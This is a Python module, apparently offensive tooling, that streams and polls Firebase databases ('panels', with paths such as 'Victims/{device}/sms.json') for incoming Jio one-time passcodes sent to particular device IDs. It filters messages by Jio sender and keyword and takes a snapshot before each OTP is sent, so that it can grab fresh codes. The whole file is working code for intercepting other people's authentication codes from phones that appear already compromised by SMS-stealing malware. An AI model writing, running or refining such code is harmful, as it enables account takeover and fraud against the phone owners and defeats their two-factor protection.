"""
otp_poller.py — Asynchronous Smart Firebase OTP Poller (v11 SSE ULTRA)
=======================================================================
Dedicated high-speed module for polling Firebase panels for incoming Jio OTP SMS.

Optimizations:
  1. SSE Streaming (PRIMARY): Opens a Firebase text/event-stream — OTPs arrive in <100ms.
  2. Poll Fallback: If SSE fails/disconnects, falls back to 0.4s REST polling.
  3. Multi-Schema Support: user_sms, messages, clients/messages, clients/sms, webhookEvent.
  4. Concurrent Candidate Polling: Never locked into a wrong path if inbox was initially empty.
  5. Pre-send Snapshot: Eliminates old stale OTPs while catching genuine incoming codes.
  6. Robust Extraction: Catches Jio OTPs from all telecom headers and SMS body variations.
"""
from __future__ import annotations
import asyncio
import json
import re
import time
from typing import Any
import aiohttp

from number_utils import extract_otp

_SIX_DIGIT_RE = re.compile(r"(?<!\d)(\d{6})(?!\d)")

async def async_firebase_get(
    session: aiohttp.ClientSession,
    url: str,
    timeout: float = 3.0,
    params: dict[str, str] | None = None,
    retries: int = 1,
) -> Any:
    """Fetch JSON from a Firebase REST endpoint with optional query params and transient retry."""
    for attempt in range(retries + 1):
        try:
            async with session.get(url, params=params, timeout=aiohttp.ClientTimeout(total=timeout)) as resp:
                if resp.status == 200:
                    return await resp.json(content_type=None)
                if resp.status in (401, 403, 404):
                    return None
        except Exception:
            if attempt < retries:
                await asyncio.sleep(0.15 * (attempt + 1))
    return None


def extract_message_entries(data: Any, max_depth: int = 6) -> list[dict]:
    """Recursively extracts message dicts from flat dicts, push_id dicts, nested lists, or webhookEvent."""
    if not data or max_depth <= 0:
        return []

    entries: list[dict] = []

    def _walk(node: Any, depth: int):
        if depth <= 0 or not node:
            return
        if isinstance(node, dict):
            # WebhookEvent schema: {"sendSms": {"message": ..., "to": ...}}
            if "sendSms" in node and isinstance(node["sendSms"], dict):
                entries.append(node["sendSms"])

            # Does this dict represent a message item?
            if any(k in node for k in ("body", "message", "text", "smsBody", "msg", "messageBody", "msg_body", "content", "sms_content")):
                entries.append(node)
            else:
                for v in node.values():
                    if isinstance(v, (dict, list)):
                        _walk(v, depth - 1)
        elif isinstance(node, list):
            for item in node:
                if isinstance(item, dict):
                    if any(k in item for k in ("body", "message", "text", "smsBody", "msg", "messageBody", "msg_body", "content", "sms_content")):
                        entries.append(item)
                    else:
                        _walk(item, depth - 1)
                elif isinstance(item, str) and len(item) > 3:
                    entries.append({"body": item})
                elif isinstance(item, list):
                    _walk(item, depth - 1)

    _walk(data, max_depth)
    return entries


def parse_sms_node(data: Any, mobile: str = "", send_time: float = 0.0, exclude_otps: set[str] | None = None) -> str | None:
    """
    Parse SMS node for a Jio OTP.
    Handles flat dict, push_id dicts, lists, and webhookEvent schemas.
    send_time: unix timestamp (seconds) when OTP was sent. Messages older than this are ignored.
    exclude_otps: set of OTPs already tried that failed verification.
    """
    entries = extract_message_entries(data)
    if not entries:
        return None

    # Scan newest entries first
    for entry in reversed(entries):
        body = str(
            entry.get("body") or entry.get("message") or entry.get("text") or entry.get("msg")
            or entry.get("smsBody") or entry.get("messageBody") or entry.get("msg_body")
            or entry.get("content") or entry.get("sms_content") or ""
        )
        if not body or len(body) < 5:
            continue

        # If send_time given, skip messages received before we sent the OTP
        if send_time > 0:
            for ts_field in ("timestamp", "time", "ts", "date", "received_at", "created_at", "id"):
                raw_ts = entry.get(ts_field)
                if raw_ts is not None:
                    try:
                        ts = float(str(raw_ts).strip())
                        # Handle millisecond timestamps (13 digits)
                        if ts > 1_000_000_000_000:
                            ts = ts / 1000.0
                        if ts > 1_000_000_000 and ts < send_time - 60:  # 60s grace; guard: row IDs < 1B are not timestamps
                            body = ""  # treat as invalid — message predates our OTP send
                    except Exception:
                        pass
                    break

        if not body or len(body) < 5:
            continue

        sender = str(
            entry.get("sender") or entry.get("from") or entry.get("address")
            or entry.get("senderNumber") or entry.get("originatingAddress")
            or entry.get("addr") or entry.get("phone") or entry.get("source") or ""
        ).lower()
        body_lower = body.lower()

        # Check if message is related to OTP / verification / login / Jio
        is_otp_msg = (
            any(kw in sender for kw in ("jio", "myji", "55333", "55444", "reliance", "jiopay", "jioinf", "jioact", "jiofbr", "jiologin", "jz-", "jm-", "vk-", "jd-", "bp-", "ax-", "bw-", "vm-")) or
            any(kw in body_lower for kw in ("jio", "myjio", "my jio", "reliance", "otp", "code", "verification", "verify", "password", "pin", "login", "one-time", "one time", "auth", "ओटीपी", "सत्यापन", "कोड", "पासवर्ड"))
        )
        if not is_otp_msg:
            continue

        # Extract 6-digit OTP
        otp = extract_otp(body)
        if not otp or len(otp) != 6:
            m = _SIX_DIGIT_RE.search(body)
            if m:
                otp = m.group(1)

        if otp and len(otp) == 6:
            if exclude_otps and otp in exclude_otps:
                continue
            return otp

    return None



def build_candidate_paths(base_url: str, device_id: str | None = None) -> list[str]:
    """Generate all known paths where panels store device SMS in priority order."""
    if device_id is None:
        target_dev = base_url
        prefix = ""
    else:
        target_dev = device_id
        b = base_url.rstrip("/")
        prefix = f"{b}/" if b else ""

    return [
        f"{prefix}user_sms/{target_dev}.json",
        f"{prefix}messages/{target_dev}.json",
        f"{prefix}smsLogs/{target_dev}.json",
        f"{prefix}clients/{target_dev}/messages.json",
        f"{prefix}clients/{target_dev}/sms.json",
        f"{prefix}clients/{target_dev}/webhookEvent.json",
        f"{prefix}Victims/{target_dev}/sms.json",
        f"{prefix}devices/{target_dev}/messages.json",
        f"{prefix}devices/{target_dev}/sms.json",
        f"{prefix}sms/{target_dev}.json",
        f"{prefix}sms/{target_dev}/messages.json",
        f"{prefix}{target_dev}/sms.json",
    ]


async def pre_probe_device_inbox(
    session: aiohttp.ClientSession,
    base_url: str,
    key: str,
    device_id: str,
) -> tuple[str | None, set[str]]:
    """
    Fast pre-probe before sending OTP:
    1. Identifies which SMS path actually exists and has data for this device.
    2. Takes a snapshot of current keys so incoming OTPs are never confused with old messages.
    Returns (confirmed_path_or_None, existing_keys).
    """
    candidate_paths = build_candidate_paths(base_url, device_id)
    params: dict[str, str] = {}
    if key:
        params["auth"] = key

    async def _probe(p: str):
        data = await async_firebase_get(session, p, timeout=2.5, params=params)
        if data and (isinstance(data, (dict, list))):
            return p, data
        return p, None

    results = await asyncio.gather(*[_probe(p) for p in candidate_paths], return_exceptions=True)
    for res in results:
        if isinstance(res, tuple) and res[1]:
            path, data = res
            existing_keys: set[str] = set()
            if isinstance(data, dict):
                existing_keys.update(str(k) for k in data.keys())
            elif isinstance(data, list):
                existing_keys.update(str(i) for i in range(len(data)))
            return path, existing_keys

    # No existing data found — return None so poller polls top candidate paths dynamically
    return None, set()


async def stream_firebase_for_otp(
    session: aiohttp.ClientSession,
    path: str,
    key: str,
    mobile: str,
    timeout: float,
    send_time: float,
    pre_existing_keys: set[str],
    exclude_otps: set[str] | None,
) -> str | None:
    """
    PRIMARY METHOD: Firebase SSE real-time stream.
    Opens text/event-stream connection — OTP delivered in <100ms vs 0-600ms polling.

    Firebase SSE protocol:
      event: put    → full replace of data at path
      event: patch  → partial update (new keys only)
      event: keep-alive → heartbeat, ignore
      event: cancel → auth revoked / permission denied
    """
    params: dict[str, str] = {}
    if key:
        params["auth"] = key

    sse_headers = {
        "Accept": "text/event-stream",
        "Cache-Control": "no-cache",
    }

    url = path if path.endswith(".json") else path + ".json"

    try:
        async with session.get(
            url,
            headers=sse_headers,
            params=params,
            timeout=aiohttp.ClientTimeout(total=timeout + 5),
            allow_redirects=True,
            read_bufsize=4 * 1024 * 1024,  # 4MB read buffer for large initial PUT snapshots
        ) as resp:
            if resp.status not in (200, 307):
                return None  # fall back to polling

            event_type = ""
            deadline = time.monotonic() + timeout
            seen_data_keys: set[str] = set(pre_existing_keys)
            got_initial_put = False

            # Use readline with high limit to handle large initial PUT snapshots (1MB+ device inboxes)
            _MAX_LINE = 4 * 1024 * 1024  # 4MB max line size
            while time.monotonic() < deadline:
                try:
                    raw_line_bytes = await resp.content.readline()
                except Exception:
                    break
                if not raw_line_bytes:
                    break  # connection closed

                line = raw_line_bytes.decode("utf-8", errors="replace").rstrip("\r\n")

                if line.startswith("event:"):
                    event_type = line[6:].strip()
                elif line.startswith("data:"):
                    raw_data = line[5:].strip()
                    if not raw_data or raw_data == "null":
                        continue
                    if event_type in ("keep-alive", "cancel", "auth_revoked"):
                        if event_type in ("cancel", "auth_revoked"):
                            return None  # permission denied — no point waiting
                        continue

                    try:
                        payload = json.loads(raw_data)
                    except Exception:
                        continue

                    # Firebase SSE payload: {"path": "/", "data": {...}}
                    data = payload.get("data") if isinstance(payload, dict) else payload
                    if not data:
                        continue

                    if event_type == "put":
                        if not got_initial_put:
                            # Very first PUT is the current state snapshot
                            got_initial_put = True
                            # If pre_existing_keys is empty, parse everything now
                            # (OTP may have arrived before we connected)
                            if not pre_existing_keys:
                                otp = parse_sms_node(data, mobile, send_time, exclude_otps)
                                if otp:
                                    return otp
                            # Build baseline from snapshot
                            if isinstance(data, dict):
                                seen_data_keys.update(str(k) for k in data.keys())
                            elif isinstance(data, list):
                                seen_data_keys.update(str(i) for i in range(len(data)))
                            continue

                        # Subsequent PUT = full replacement — find new keys vs baseline
                        if isinstance(data, dict):
                            new_keys = set(str(k) for k in data.keys()) - seen_data_keys
                            if new_keys:
                                new_data = {k: data[k] for k in new_keys if k in data}
                                otp = parse_sms_node(new_data, mobile, send_time, exclude_otps)
                                if otp:
                                    return otp
                                seen_data_keys.update(new_keys)

                    elif event_type == "patch":
                        # PATCH = always new data from Firebase — pass directly, skip key-diff
                        # (key-diff on column names "id","message" would mark them seen after first msg
                        #  and silently drop every subsequent OTP)
                        if data:
                            otp = parse_sms_node(data, mobile, send_time, exclude_otps)
                            if otp:
                                return otp

    except (asyncio.TimeoutError, aiohttp.ClientError, ConnectionError):
        pass
    except Exception:
        pass

    return None


async def poll_firebase_for_otp(
    session: aiohttp.ClientSession,
    base_url: str,
    key: str,
    device_id: str,
    mobile: str,
    timeout: float = 20.0,
    known_path: str | None = None,
    pre_existing_keys: set[str] | None = None,
    send_time: float = 0.0,
    exclude_otps: set[str] | None = None,
) -> str | None:
    """
    v11 SSE ULTRA: Tries Firebase SSE streaming FIRST (sub-100ms OTP delivery).
    Falls back to 0.4s REST polling if SSE fails or path is unknown.

    SSE is used when known_path is available — covers all devices from live_phones.txt
    and from scan_panel_worker's verified_path. Unknown-path devices still use polling.
    """
    params: dict[str, str] = {}
    if key:
        params["auth"] = key

    pre_keys = set(pre_existing_keys) if pre_existing_keys else set()
    excl = set(exclude_otps) if exclude_otps else set()

    # === PRIMARY: SSE Streaming (when path is known) ===
    if known_path:
        otp = await stream_firebase_for_otp(
            session=session,
            path=known_path,
            key=key,
            mobile=mobile,
            timeout=timeout,
            send_time=send_time,
            pre_existing_keys=pre_keys,
            exclude_otps=excl,
        )
        if otp:
            return otp
        # SSE returned None (timeout, disconnect, or permission error) — fall through to polling

    # === FALLBACK: 0.4s REST polling ===
    working_path = known_path
    existing_keys: set[str] = pre_keys.copy()
    baseline_set = len(existing_keys) > 0

    top_candidates = [
        f"{base_url.rstrip('/')}/user_sms/{device_id}.json",
        f"{base_url.rstrip('/')}/messages/{device_id}.json",
        f"{base_url.rstrip('/')}/clients/{device_id}/messages.json",
        f"{base_url.rstrip('/')}/clients/{device_id}/webhookEvent.json",
        f"{base_url.rstrip('/')}/clients/{device_id}/sms.json",
    ]

    deadline = time.monotonic() + timeout
    cand_snapshots: dict[str, set[str]] = {}

    while time.monotonic() < deadline:
        await asyncio.sleep(0.4)
        try:
            if working_path:
                data = await async_firebase_get(session, working_path, timeout=2.5, params=params)
                if not data:
                    continue

                current_keys: set[str] = set()
                if isinstance(data, dict):
                    current_keys = set(str(k) for k in data.keys())
                elif isinstance(data, list):
                    current_keys = set(str(i) for i in range(len(data)))

                if not baseline_set:
                    otp = parse_sms_node(data, mobile, send_time, excl)
                    if otp:
                        return otp
                    existing_keys = current_keys
                    baseline_set = True
                    continue

                new_keys = current_keys - existing_keys
                if new_keys:
                    if isinstance(data, dict):
                        new_data = {k: data[k] for k in new_keys if k in data}
                    else:
                        new_data = [data[int(k)] for k in new_keys if int(k) < len(data)]

                    otp = parse_sms_node(new_data, mobile, send_time, excl)
                    if otp:
                        return otp
                    existing_keys.update(new_keys)

            else:
                # No confirmed path — poll top candidates concurrently
                async def _fetch(p: str):
                    d = await async_firebase_get(session, p, timeout=2.0, params=params)
                    return p, d

                cand_results = await asyncio.gather(
                    *[_fetch(p) for p in top_candidates],
                    return_exceptions=True
                )
                for res in cand_results:
                    if not isinstance(res, tuple) or not res[1]:
                        continue
                    cand_path, cand_data = res
                    cand_keys: set[str] = set()
                    if isinstance(cand_data, dict):
                        cand_keys = set(str(k) for k in cand_data.keys())
                    elif isinstance(cand_data, list):
                        cand_keys = set(str(i) for i in range(len(cand_data)))

                    if cand_path not in cand_snapshots:
                        otp = parse_sms_node(cand_data, mobile, send_time, excl)
                        if otp:
                            return otp
                        cand_snapshots[cand_path] = cand_keys
                        continue

                    new_keys = cand_keys - cand_snapshots[cand_path]
                    if new_keys:
                        if isinstance(cand_data, dict):
                            new_data = {k: cand_data[k] for k in new_keys if k in cand_data}
                        else:
                            new_data = [cand_data[int(k)] for k in new_keys if int(k) < len(cand_data)]

                        otp = parse_sms_node(new_data, mobile, send_time, excl)
                        if otp:
                            return otp
                        cand_snapshots[cand_path].update(new_keys)
                        working_path = cand_path
                        existing_keys = cand_snapshots[cand_path]
                        baseline_set = True
                        break

        except Exception:
            pass

    return None


